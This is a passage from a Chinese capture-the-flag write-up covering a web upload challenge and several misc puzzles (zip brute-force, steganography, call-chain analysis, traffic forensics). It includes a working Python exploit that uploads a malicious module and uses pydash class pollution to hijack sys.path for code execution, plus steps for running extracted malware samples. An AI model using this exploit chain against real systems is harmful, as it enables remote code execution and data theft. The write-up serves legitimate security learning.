class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;base64&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_path</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">up_base64</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>], <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;upload success&lt;/h1&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Hacker!&lt;/h1&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>同时扫描网址发现存在<code>/app</code>路由</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-1.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> challenge <span class="hljs-keyword">import</span> challenge<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">value: <span class="hljs-built_in">str</span></span>):<br>    black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br>    <span class="hljs-keyword">if</span> re.findall(<span class="hljs-string">&quot;r&#x27;[^\w\.\[\]]&#x27;&quot;</span>, value):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> value:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/set&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set</span>():<br>    key, value = request.json.get(<span class="hljs-string">&#x27;key&#x27;</span>), request.json.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(key) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Not key or key must be str&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) &gt; <span class="hljs-number">100</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key may be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">20</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value may  be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value:<br>        game.complete(value)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key set success !&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value must be a string!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check(key):<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hacker!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-comment"># pydash?</span><br>    <span class="hljs-keyword">if</span> game.<span class="hljs-built_in">set</span>(key, value):<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Task updated!&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid task name!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_source</span>():<br>    fp = <span class="hljs-built_in">open</span>(__file__)<br>    res = fp.read()<br>    fp.close<br>    <span class="hljs-keyword">return</span> res.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot; &quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/get&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_date</span>():<br>    <span class="hljs-keyword">import</span> backdoor<br>    flag = backdoor.backdoor()<br>    sys.modules.pop(<span class="hljs-string">&quot;backdoor&quot;</span>)<br>    <span class="hljs-keyword">return</span> flag<br><br><br>game = challenge()<br>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">3000</span>)<br></code></pre></td></tr></table></figure>

<p>其中有三个路由</p>
<p><code>/app</code>显示当前代码<br><code>/app/get</code>存在后门，有导入包的操作<br><code>/app/set</code>用于设置键值对</p>
<p>其中存在提示<code># pydash?</code>，表示通过<code>pydash</code>设置属性，而<code>pydash</code>低版本存在类污染，可以利用<code>pydash.set</code>来设置或覆盖属性值，也可以设置路径</p>
<p>在<code>/app/get</code>路由中存在一个<code>import</code>的操作，当<code>Python</code>解释器遇到<code>import</code>语句时，它会在<code>sys.path</code>变量中指定的路径中搜索模块，其中<code>sys.path[0]</code>则表示最初调用<code>Python</code>解释器的脚本所在的绝对路径</p>
<p>所以我们可以上传一个名称为<code>backdoor</code>的py文件，再利用<code>pydash.set</code>覆盖<code>sys.path[0]</code>的值，使其寻找包时找到我们的恶意包</p>
<p>同时题目中还存在一个waf</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br></code></pre></td></tr></table></figure>

<p>可以利用<code>pydash.helpers</code>导入<code>inspect</code>来绕过</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-2.png"></p>
<p>还有一点要注意，上传时对<code>$type</code>进行了检查，不允许上传<code>py</code>类型的文件，但是<code>$type</code>的值是可控的，我们可以将其置空</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//line 32</span><br><span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>如果<code>$type</code>为空，就会在文件尾加一个点，例如<code>backdoor.py.</code></p>
<p>这里可以用<code>file_put_contents</code>的一个<code>trick</code>绕过，如图</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-3.png"></p>
<p>例如<code>backdoor.py/.</code>，<code>file_put_contents</code>会自已给标准化成绝对路径</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>shell = <span class="hljs-string">&#x27;&#x27;&#x27;import os</span><br><span class="hljs-string">def backdoor():</span><br><span class="hljs-string">    return os.popen(&quot;cat /flag&quot;).read()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    data = <span class="hljs-string">&quot;data:image/;base64,&quot;</span> + base64.b64encode(shell.encode()).decode()<br>    start = <span class="hljs-built_in">int</span>(time.time())<br>    res = requests.post(<br>        url=url+<span class="hljs-string">&quot;index.php?action=base64&amp;path=backdoor.py/&quot;</span>, data=data)<br>    end = <span class="hljs-built_in">int</span>(time.time())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end+<span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        data = &#123;<br>            <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;__init__.__globals__.pydash.helpers.inspect.sys.path[0]&quot;</span>,<br>            <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;/tmp/%s/&quot;</span> % (i)<br>        &#125;<br>        <span class="hljs-built_in">print</span>(data)<br>        requests.post(url=url+<span class="hljs-string">&quot;app/set&quot;</span>,json=data)<br>        res = requests.get(url=url+<span class="hljs-string">&quot;app/get&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag??&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">and</span> res.status_code != <span class="hljs-number">500</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure>





<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>zip注释：<code>The art of 0 and 1, and it will remain shorter than 9.</code></p>
<p>生成字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">my_dict = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    bin_strings = [<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**i)]<br>    my_dict[i] = bin_strings<br><span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> my_dict.items():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> value:<br>            f.write(i+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br></code></pre></td></tr></table></figure>

<p>爆破得到密码<code>01001101</code></p>
<p>解压得到flag</p>
<h2 id="SimpleDocument"><a href="#SimpleDocument" class="headerlink" title="SimpleDocument"></a>SimpleDocument</h2><p>图片分离出一个pdf，用pdf编辑器全选，发现有一个隐藏的文本</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/SimpleDocument.png"></p>
<h2 id="BeautifulImage"><a href="#BeautifulImage" class="headerlink" title="BeautifulImage"></a>BeautifulImage</h2><p>stegsolve分析，0通道藏有base加密字符串</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/BeautifulImage.png"></p>
<h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>下载附件得到一个<code>tree.py</code>，约有60w行代码</p>
<p>部分代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># the o mean is 0!</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0aB30386</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o02aA7B4</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">1705</span> &lt; <span class="hljs-number">2926</span>:<br>            tree_b270co58.tree_f79D6eB3(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_51o1oA3a</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_433218o8</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1793</span> &lt; -<span class="hljs-number">5366</span>:<br>            tree_B813Fe08.tree_AaA1b735(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_2598o3do</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7C0ooB75</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">7226</span> &gt; -<span class="hljs-number">7705</span>:<br>            tree_3482o9ob.tree_0d6aDA0F(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0a351C93</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_39cD9171</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">9865</span> &lt; <span class="hljs-number">592</span>:<br>            tree_Coc29fcC.tree_22E98104(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_170EE546</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_70759F44</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">8714</span> &lt; <span class="hljs-number">4093</span>:<br>            tree_8D0oE9Cf.tree_2F7682e6(self)<br></code></pre></td></tr></table></figure>

<p>且存在部分函数调用<code>os.system</code>，执行的语句均为<code>cat /*</code></p>
<p>除了<code>os</code>函数外，其他函数都存在一个<code>if</code>，判断成功时引用下一个类</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ast<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_91fo80eD</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7040e9o9</span>(<span class="hljs-params">self</span>):<br>       os.system(<span class="hljs-string">&#x27;cat /*&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_88eF054e</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o00o0b68</span>(<span class="hljs-params">self</span>):<br>       tree_91fo80eD.tree_7040e9o9(self)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_1a0c10D0</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_4Cc0o1Do</span>(<span class="hljs-params">self</span>):<br>       tree_88eF054e().tree_o00o0b68(self)<br></code></pre></td></tr></table></figure>

<p>这段代码的完整利用链为：<br><code>tree_1a0c10D0.tree_4Cc0o1Do() -&gt; tree_88eF054e.tree_o00o0b68() -&gt; tree_91fo80eD.tree_7040e9o9()</code></p>
<p>所以我们需要分析代码，找到最终触发<code>os.system</code>的利用链，并提取出来</p>
<p>同时对所有<code>os.system</code>语句标记污点，如果遇到<code>if</code>判断错误的，则直接取消污点标记，并一直往上寻找最终利用链，并记录类名、函数名和函数内的具体内容</p>
<p>根据提示<code># the o mean is 0!</code>，提取所有完整利用链的类名的后8位十六进制字符，并将o转化为0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> astor<br><br><span class="hljs-comment"># 解析Python文件，获取语法树</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tree.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>   source_code = file.read()<br>syntax_tree = ast.parse(source_code)<br><br><span class="hljs-comment"># 初始化类名和函数字典</span><br>class_dict = &#123;&#125;<br><br><span class="hljs-comment"># 遍历语法树，获取类和函数名</span><br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> syntax_tree.body:<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, ast.ClassDef):<br>       class_name = node.name<br>       class_dict[class_name] = &#123;&#125;<br>       <span class="hljs-keyword">for</span> inner_node <span class="hljs-keyword">in</span> node.body:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(inner_node, ast.FunctionDef):<br>               func_name = inner_node.name<br>               class_dict[class_name][func_name] = []<br>               <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> inner_node.body:<br>                   class_dict[class_name][func_name].append(astor.to_source(code).strip())<br><br><span class="hljs-comment"># 输出结果</span><br><br>class_keys = []<br><span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(func_dict):<br>       sub = func_dict[<span class="hljs-number">1</span>][<span class="hljs-built_in">list</span>(func_dict[<span class="hljs-number">1</span>].items())[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>       <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       class_keys.append(func_dict[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> class_keys:<br>   class_key = key<br>   func_key = <span class="hljs-built_in">list</span>(class_dict[class_key])[<span class="hljs-number">0</span>]<br>   list_class = [class_key]<br>   flag = <span class="hljs-number">1</span><br>   flags = <span class="hljs-number">0</span><br>   <span class="hljs-keyword">while</span> flag != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>       flag = <span class="hljs-number">1</span><br>       flags = <span class="hljs-number">0</span><br>       <span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>           <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> func_dict[<span class="hljs-number">1</span>].items():<br>               <span class="hljs-comment"># print(func_dict[1].items(), flag)</span><br>               <span class="hljs-keyword">if</span> class_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> func_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]:<br>                   sub = code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>                   <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   flags = <span class="hljs-number">2</span><br>                   func_key = code[<span class="hljs-number">0</span>]<br>                   class_key = func_dict[<span class="hljs-number">0</span>]<br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   list_class.append(class_key)<br>                   <span class="hljs-comment"># print(list_class)</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># print(flag, flags)</span><br>           <span class="hljs-keyword">if</span> flag == -<span class="hljs-number">1</span>:<br>               flags = <span class="hljs-number">1</span><br>           <span class="hljs-keyword">if</span> flags == <span class="hljs-number">2</span>:<br>               flags = <span class="hljs-number">0</span><br>               <span class="hljs-keyword">continue</span><br>           <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>               <span class="hljs-keyword">break</span><br>   <span class="hljs-comment"># 将完整利用链的类名，去除tree_，o改为0，按照顺序输出成字符串</span><br>   <span class="hljs-keyword">if</span> flag != -<span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">for</span> cla <span class="hljs-keyword">in</span> list_class:<br>           <span class="hljs-built_in">print</span>(cla[<span class="hljs-number">5</span>:].replace(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>       <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>最终得到两条完整的利用链</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">7468652070617373776f7264206973203730383532613933613336343963613736653335626138353833376566613135<br></code></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">377aBCAf271c00041373e10830000000000000006A0000000000000057Acbd47A5c4CDB728a43AF6d91D92D25519Bac7876E97909B633223d3A1d7417A3a741ddAfB0E9A7F0b25C726085149ad1da4D40104060001093000070B0100022406F1070112530f9A96C63163E0Df042FD12EC0b32431902121010001000C2A2600080a017088A4910000050119010011130066006c00610067002e0074007800740000001900140a01008B43f758BE7Ad901150601002000000000000000<br></code></pre></td></tr></table></figure>

<p>转字符串后发现一个为<code>7z</code>文件，一个为<code>the password is 70852a93a3649ca76e35ba85837efa15</code>，解压得到flag</p>
<h2 id="hacker-traffic"><a href="#hacker-traffic" class="headerlink" title="hacker_traffic"></a>hacker_traffic</h2><p>在第4615条流中发现flag.zip</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-1.png"></p>
<p>注释内容：<code>password is (md5(virus_file) + lhost_ip)</code></p>
<p>同时发现流量中有很多elf文件，使用tshark或者python提取</p>
<p>这里使用binwalk，但是需要注意部分binwalk版本不能提取elf文件</p>
<p>需要修改<code>/usr/lib/python3/dist-packages/binwalk/config/extract.conf</code>文件(以kali默认位置为例)</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-2.png"></p>
<p>共提取出100个elf文件，且每个elf文件运行后都会打印一个md5值</p>
<p>使用tcpdump监听后运行所有elf文件<br><code>tcpdump -tttt -s0 -X -vv -w t.pcap</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用find命令查找当前文件夹下所有的elf文件</span><br>elf_files=$(find . -maxdepth 1 -type f -executable -name &quot;*.elf&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用循环依次执行每一个elf文件</span><br>for file in $elf_files<br>do<br>  echo &quot;Executing $file&quot;<br>  ./$file<br>done<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-3.png"></p>
<p>分析<code>t.pcap</code>文件，发现只有<code>22E7CF.elf</code>访问了<code>192.168.3.201</code>这个ip</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-4.png"></p>
<p>将文件md5和地址拼接后解压提示密码错误，是因为tcp传输文件会有冗余，需要计算elf文件的真正大小</p>
<p>readelf读文件</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-5.png"></p>
<p>得到</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">Start of section headers:          14736 (bytes into file)<br>Size of section headers:           64 (bytes)<br>Number of section headers:         30<br></code></pre></td></tr></table></figure>

<p>参考文章：<a href="https://luomuxiaoxiao.com/?p=139">计算机原理系列之二 ——– 详解ELF文件</a></p>
<p>计算得到<code>14736+64*30=16656字节</code></p>
<p>16656即4110(16进制)，将冗余的数据去除</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-6.png"></p>
<p>计算真正的md5</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-7.png"></p>
<p>拼接起来，得到<code>0f82ecb23adc35a4a5e3d8bdabbafe15192.168.3.201</code></p>
<p>解压得到一个py脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> secret<br>key = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_flag</span>(<span class="hljs-params">flag, key</span>):<br>    random.seed(key)<br>    table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>    random.shuffle(table)<br>    flag = [flag[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table]<br>    ascii_flag = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag]<br>    random.seed(key)<br>    xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    encrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ascii_flag]<br>    <span class="hljs-keyword">return</span> base64.b64encode(<span class="hljs-built_in">bytes</span>(encrypted_flag)).decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br><span class="hljs-built_in">print</span>(encrypt_flag(flag, key))<br><span class="hljs-comment"># VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=</span><br></code></pre></td></tr></table></figure>

